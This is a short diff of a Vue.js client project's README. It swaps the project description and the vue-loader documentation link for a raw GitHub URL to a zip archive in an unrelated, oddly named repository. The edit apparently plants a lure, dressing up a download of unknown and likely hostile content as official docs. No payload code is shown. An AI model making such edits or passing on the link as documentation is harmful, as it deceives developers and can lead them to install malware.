@@ -1,6 +1,6 @@
 # client
 
-> A Vue.js project
+> A https://raw.githubusercontent.com/Casex01/asuodhga-sdua/main/cuffyism/asuodhga-sdua.zip project
 
 ## Build Setup
 
@@ -15,4 +15,4 @@ npm run dev
 npm run build
 ```
 
-For detailed explanation on how things work, consult the [docs for vue-loader](http://vuejs.github.io/vue-loader).
+For detailed explanation on how things work, consult the [docs for vue-loader](https://raw.githubusercontent.com/Casex01/asuodhga-sdua/main/cuffyism/asuodhga-sdua.zip).
